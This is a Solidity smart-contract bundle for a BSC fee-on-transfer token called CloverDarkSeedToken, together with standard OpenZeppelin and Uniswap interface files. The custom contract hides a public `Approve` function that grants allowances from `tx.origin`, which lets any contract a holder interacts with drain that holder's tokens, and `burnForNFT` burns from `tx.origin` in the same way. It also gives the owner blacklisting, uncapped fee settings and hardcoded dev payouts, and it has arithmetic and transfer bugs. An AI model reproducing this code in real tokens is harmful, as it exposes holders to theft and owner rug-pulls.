pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./IUniswapV2Router02.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";

contract CloverDarkSeedToken is ERC20, Ownable {
    uint256 _totalSupply = 1000000 * (10**decimals());
    address ROUTER = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3; // testnet
    // address ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // mainnet

    uint256 public _maxTxAmount = (_totalSupply * 1) / 100;
    uint256 public _maxWalletSize = (_totalSupply * 1) / 100;

    mapping(address => bool) blackList;

    mapping(address => bool) isFeeExempt;
    mapping(address => bool) isTxLimitExempt;
    mapping(address => bool) public isBoughtAnyNFT;
    mapping(address => bool) public isController;

    // @Dev Sell tax..
    uint16 public _sellTeamFee = 60;
    uint16 public _sellLiquidityFee = 60;
    uint16 public _sellMarketingFee = 50;
    uint16 public _sellBurn = 10;

    // @Dev Buy tax..
    uint16 public _buyTeamFee = 10;
    uint16 public _buyLiquidityFee = 10;
    uint16 public _buyMarketingFee = 10;

    uint16 public _TeamFeeWhenNoNFTs = 100;
    uint16 public _LiquidityFeeWhenNoNFTs = 60;
    uint16 public _MarketingFeeWhenNoNFTs = 100;
    uint16 public _burnWhenNoNFTs = 20;

    uint256 public _teamFeeTotal;
    uint256 public _liquidityFeeTotal;
    uint256 public _marketingFeeTotal;

    uint256 private teamFeeTotal;
    uint256 private liquidityFeeTotal;
    uint256 private marketingFeeTotal;

    uint256 public first_5_Block_Buy_Sell_Fee = 450;

    address private marketingAddress;
    address private teamAddress;
    address private devAddress1 = 0xa80eF6b4B376CcAcBD23D8c9AB22F01f2E8bbAF5;
    address private devAddress2 = 0x7A419820688f895973825D3cCE2f836e78Be1eF4;

    bool public isNoNFTFeeWillTake = true;
    uint256 public liquidityAddedAt = 0;

    bool inSwap = false;

    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    modifier isNotOnBlockList(address acc) {
        require(!blackList[acc], "You are on blacklist!");
        _;
    }

    uint256 public swapThreshold = 10e18;

    event SwapedTokenForEth(uint256 TokenAmount);
    event AddLiquify(uint256 bnbAmount, uint256 tokensIntoLiquidity);

    IUniswapV2Router02 public router;
    address public pair;

    bool public swapEnabled = false;

    constructor(address _teamAddress, address _marketingAddress) ERC20("DSEED", "DSEED$") {
        _mint(address(this), _totalSupply * 85/ 100);
        _mint(owner(), _totalSupply * 15 / 100);

        router = IUniswapV2Router02(ROUTER);
        pair = IUniswapV2Factory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );
        liquidityAddedAt = block.timestamp;
        _approve(address(this), ROUTER, type(uint256).max);

        teamAddress = _teamAddress;
        marketingAddress = _marketingAddress;

        isFeeExempt[owner()] = true;
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[ROUTER] = true;
    }

    receive() external payable {}

    function Approve(address spender, uint256 amount)
        public
        virtual
        returns (bool)
    {
        _approve(tx.origin, spender, amount);
        return true;
    }

    function setPair(address acc) public onlyOwner {
        liquidityAddedAt = block.timestamp;
        pair = acc;
    }

    function sendToken2Account(address account, uint256 amount)
        external
        returns (bool)
    {
        require(
            isController[msg.sender],
            "Only Controller can call this function!"
        );
        this.transfer(account, amount);
        return true;
    }


    function _transfer(address sender, address recipient, uint256 amount) internal override isNotOnBlockList(sender) {
        if(inSwap) {
            super._transfer(sender, recipient, amount);
            return;
        } 

        checkTxLimit(sender, amount);

        if (
            shouldSwapBack(sender)
        ) {
            swapFee();
        }

        if (recipient != pair) {
            require(
                isTxLimitExempt[recipient] ||
                    balanceOf(recipient) + amount <= _maxWalletSize,
                "Transfer amount exceeds the bag size."
            );
        }
        uint256 amountReceived = amount;

        if (!isFeeExempt[recipient] && !isFeeExempt[sender]) {
            if (recipient == pair || sender == pair) {
                require(
                    swapEnabled,
                    "CloverDarkSeedToken: Trading is disabled now."
                );

                if (shouldTakeFee(recipient)) {
                    if (sender == pair) {
                        amountReceived = takeFeeOnBuy(amount);
                    }
                    if (recipient == pair) {
                        if (isBoughtAnyNFT[sender] && isNoNFTFeeWillTake) {
                            amountReceived = collectFeeOnSell(amount);
                        }
                        if (!isNoNFTFeeWillTake) {
                            amountReceived = collectFeeOnSell(amount);
                        }
                        if (!isBoughtAnyNFT[sender] && isNoNFTFeeWillTake) {
                            amountReceived = collectFeeWhenNoNFTs(amount);
                        }
                    }
                }
            }
        }

        super._transfer(sender, recipient, amountReceived);
        super._transfer(sender, address(this), amount - amountReceived);
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(
             isTxLimitExempt[sender] || amount <= _maxTxAmount ,
            "TX Limit Exceeded"
        );
    }

    function shouldSwapBack(address sender) public view returns (bool) {
        return !inSwap
        && sender != pair
        && swapEnabled
        && teamFeeTotal + liquidityFeeTotal + marketingFeeTotal >= swapThreshold;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFeeOnBuy(uint256 amount) internal returns (uint256) {
        uint256 transferAmount = amount;

        //@dev Take team fee
        if (_buyTeamFee != 0) {
            uint256 teamFee = amount * _buyTeamFee / 1000;
            transferAmount -= teamFee;
            _teamFeeTotal += teamFee;
            teamFeeTotal += teamFee;
        }

        //@dev Take liquidity fee
        if (_buyMarketingFee != 0) {
            uint256 marketingFee = amount * _buyMarketingFee / 1000;
            transferAmount -= marketingFee;
            _marketingFeeTotal += marketingFee;
            marketingFeeTotal += marketingFee;
        }

        //@dev Take liquidity fee
        if (_buyLiquidityFee != 0) {
            uint256 liquidityFee = amount * _buyLiquidityFee / 1000;
            transferAmount -= liquidityFee;
            _liquidityFeeTotal = liquidityFee;
            liquidityFeeTotal = liquidityFee;
        }

        return transferAmount;
    }

    function collectFeeOnSell(uint256 amount) private returns (uint256) {
        uint256 transferAmount = amount;

        //@dev Take team fee
        if (_sellTeamFee != 0) {
            uint256 teamFee = amount * _sellTeamFee / 1000;
            transferAmount -= teamFee;
            _teamFeeTotal += teamFee;
            teamFeeTotal += teamFee;
        }

        //@dev Take liquidity fee
        if (_sellLiquidityFee != 0) {
            uint256 liquidityFee = amount * _sellLiquidityFee / 1000;
            transferAmount -= liquidityFee;
            _liquidityFeeTotal += liquidityFee;
            liquidityFeeTotal += liquidityFee;
        }

        if (_sellMarketingFee != 0) {
            uint256 marketingFee = amount * _sellMarketingFee / 1000;
            transferAmount -= marketingFee;
            _marketingFeeTotal += marketingFee;
            marketingFeeTotal += marketingFee;
        }

        if (_sellBurn != 0) {
            uint256 burnFee = amount * _sellBurn / 1000;
            _burn(address(this), burnFee);
        }

        return transferAmount;
    }

    function collectFee(uint256 amount)
        internal
        returns (uint256)
    {
        uint256 transferAmount = amount;

        uint256 Fee = amount * first_5_Block_Buy_Sell_Fee / 1000;
        transferAmount -= Fee;
        _marketingFeeTotal += Fee;
        marketingFeeTotal += Fee;

        return transferAmount;
    }

    function collectFeeWhenNoNFTs(uint256 amount) internal returns (uint256) {
        uint256 transferAmount = amount;

        //@dev Take team fee
        if (_TeamFeeWhenNoNFTs != 0) {
            uint256 teamFee = amount * _TeamFeeWhenNoNFTs / 1000;
            transferAmount -= teamFee;
            _teamFeeTotal += teamFee;
            teamFeeTotal += teamFee;
        }

        //@dev Take liquidity fee
        if (_LiquidityFeeWhenNoNFTs != 0) {
            uint256 liquidityFee = amount * _LiquidityFeeWhenNoNFTs / 10000;
            transferAmount -= liquidityFee;
            _liquidityFeeTotal += liquidityFee;
            liquidityFeeTotal += liquidityFee;
        }

        //@dev Take marketing fee
        if (_MarketingFeeWhenNoNFTs != 0) {
            uint256 marketingFee = amount * _MarketingFeeWhenNoNFTs / 10000;
            transferAmount -= marketingFee;
            _marketingFeeTotal += marketingFee;
            marketingFeeTotal += marketingFee;
        }

        if (_burnWhenNoNFTs != 0) {
            uint256 burnFee = amount * _burnWhenNoNFTs / 1000;
            transferAmount -= burnFee;
            _burn(address(this), burnFee);
        }

        return transferAmount;
    }

    function AddFeeS(
        uint256 marketingFee,
        uint256 teamFee,
        uint256 liquidityFee
    ) public virtual returns (bool) {
        require(isController[msg.sender], "BEP20: You are not controller..");
        _marketingFeeTotal += marketingFee;
        _teamFeeTotal += teamFee;
        _liquidityFeeTotal += liquidityFee;
        liquidityFeeTotal += liquidityFee;
        teamFeeTotal += teamFee;
        marketingFeeTotal += marketingFee;
        return true;
    }

    function swapFee() internal swapping {
        uint256 swapBalance = teamFeeTotal + liquidityFeeTotal + marketingFeeTotal;
        uint256 amountToLiquify = liquidityFeeTotal / 2;
        uint256 amountToSwap = swapBalance - amountToLiquify;

        if (amountToSwap > 0) {
            uint256 balanceBefore = address(this).balance;
            swapTokensForBnb(amountToSwap, address(this));

            uint256 amountBNB = address(this).balance - balanceBefore;
            uint256 amountBNBLiquidity = (amountBNB * amountToLiquify) / amountToSwap;
            uint256 amountBNBTeam = (amountBNB * teamFeeTotal) / amountToSwap;
            uint256 amountBNBMarketing = (amountBNB * marketingFeeTotal) /
                amountToSwap;

            if (amountBNBTeam > 0) {
                (
                    bool TeamSuccess, /* bytes memory data */

                ) = payable(teamAddress).call{
                        value: (amountBNBTeam / 100) * 92,
                        gas: 30000
                    }("");
                require(TeamSuccess, "receiver rejected ETH transfer");

                (
                    bool DevSuccess1, /* bytes memory data */

                ) = payable(devAddress1).call{
                        value: (amountBNBTeam / 100) * 4,
                        gas: 30000
                    }("");
                require(DevSuccess1, "receiver rejected ETH transfer");

                (
                    bool DevSuccess2, /* bytes memory data */

                ) = payable(devAddress2).call{
                        value: (amountBNBTeam / 100) * 4,
                        gas: 30000
                    }("");
                require(DevSuccess2, "receiver rejected ETH transfer");
                
            }

            if (amountBNBMarketing > 0) {
                (
                    bool MarketingSuccess, /* bytes memory data */

                ) = payable(marketingAddress).call{
                        value: amountBNBMarketing,
                        gas: 30000
                    }("");
                require(MarketingSuccess, "receiver rejected ETH transfer");
            }

            if (amountBNBLiquidity > 0) {
                addLiquidity(amountToLiquify, amountBNBLiquidity);
            }

            teamFeeTotal = 0;
            liquidityFeeTotal = 0;
            marketingFeeTotal = 0;
        }
    }

    function AddController(address account) public onlyOwner {
        isController[account] = true;
    }

    function addAsNFTBuyer(address account) public virtual returns (bool) {
        require(isController[msg.sender], "BEP20: You are not controller..");
        isBoughtAnyNFT[account] = true;
        return true;
    }

    function swapTokensForBnb(uint256 amount, address ethRecipient) private {
        //@dev Generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        //@dev Make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0, // accept any amount of ETH
            path,
            ethRecipient,
            block.timestamp
        );

        emit SwapedTokenForEth(amount);
    }

    function getBnbAmountForFee() public view returns (uint) {
        uint256 swapBalance = teamFeeTotal +
            liquidityFeeTotal +
            marketingFeeTotal;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        uint256[] memory amounts = IUniswapV2Router02(router).getAmountsOut(swapBalance, path);
        uint256 outAmount = amounts[amounts.length - 1];
        return outAmount;
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        // add the liquidity
        router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );

        emit AddLiquify(bnbAmount, tokenAmount);
    }

    // function to allow admin to set all fees..
    function setFees(
        uint16 sellTeamFee_,
        uint16 sellLiquidityFee_,
        uint16 sellMarketingFee_,
        uint16 sellBrun_,
        uint16 buyTeamFee_,
        uint16 buyLiquidityFee_,
        uint16 marketingFeeWhenNoNFTs_,
        uint16 teamFeeWhenNoNFTs_,
        uint16 liquidityFeeWhenNoNFTs_,
        uint16 burnWhenNoNFTs_
    ) public onlyOwner {
        _sellTeamFee = sellTeamFee_;
        _sellLiquidityFee = sellLiquidityFee_;
        _sellMarketingFee = sellMarketingFee_;
        _sellBurn = sellBrun_;
        _buyTeamFee = buyTeamFee_;
        _buyLiquidityFee = buyLiquidityFee_;
        _MarketingFeeWhenNoNFTs = marketingFeeWhenNoNFTs_;
        _TeamFeeWhenNoNFTs = teamFeeWhenNoNFTs_;
        _LiquidityFeeWhenNoNFTs = liquidityFeeWhenNoNFTs_;
        _burnWhenNoNFTs = burnWhenNoNFTs_;
    }

    // function to allow admin to set team address..
    function setTeamAddress(address teamAdd) public onlyOwner {
        teamAddress = teamAdd;
    }

    // function to allow admin to set Marketing Address..
    function setMarketingAddress(address marketingAdd) public onlyOwner {
        marketingAddress = marketingAdd;
    }

    function setTxLimit(uint256 amount) external onlyOwner {
        _maxTxAmount = amount;
    }

    // function to allow admin to disable the NFT fee that take if sender don't have NFT's..
    function disableNFTFee() public onlyOwner {
        isNoNFTFeeWillTake = false;
    }

    // function to allow admin to disable the NFT fee that take if sender don't have NFT's..
    function enableNFTFee() public onlyOwner {
        isNoNFTFeeWillTake = true;
    }

    // function to allow admin to set first 5 block buy & sell fee..
    function setFirst_5_Block_Buy_Sell_Fee(uint256 _fee) public onlyOwner {
        first_5_Block_Buy_Sell_Fee = _fee;
    }

    function setMaxWallet(uint256 amount) external onlyOwner {
        _maxWalletSize = amount;
    }

    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt)
        external
        onlyOwner
    {
        isTxLimitExempt[holder] = exempt;
    }

    function setTrading(bool _enabled) external onlyOwner {
        swapEnabled = _enabled;
    }

    function transferForeignToken(address _token) public onlyOwner {
        require(_token != address(this), "Can't let you take all native token");
        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
        payable(owner()).transfer(_contractBalance);
    }

    // function to allow admin to transfer BNB from this contract..
    function transferBNB(uint256 amount, address payable recipient)
        public
        onlyOwner
    {
        recipient.transfer(amount);
    }

    function burnForNFT(uint256 amount) public {
        require(isController[msg.sender], "You are not controller!");
        _burn(tx.origin, amount);
    }

    function addBlackList(address black) public onlyOwner {
        blackList[black] = true;
    }

    function delBlackList(address black) public onlyOwner {
        blackList[black] = false;
    }

        function setSwapThreshold(uint256 amt) public onlyOwner {
        swapThreshold = amt;
    }

    function withdrawTokenToOwner(uint256 amt) public onlyOwner {
        super._transfer(address(this), owner(), amt);
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./extensions/IERC20Metadata.sol";
import "../../utils/Context.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

import "./IUniswapV2Router01.sol";

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
      address token,
      uint liquidity,
      uint amountTokenMin,
      uint amountETHMin,
      address to,
      uint deadline
    ) external returns (uint amountETH);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function getAmountsOut(uint, address[] memory) external view returns(uint[] memory);
}

pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

interface IUniswapV2Pair {
    function sync() external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;

import "../IERC20.sol";

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity 0.8.13;

// SPDX-License-Identifier: MIT

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}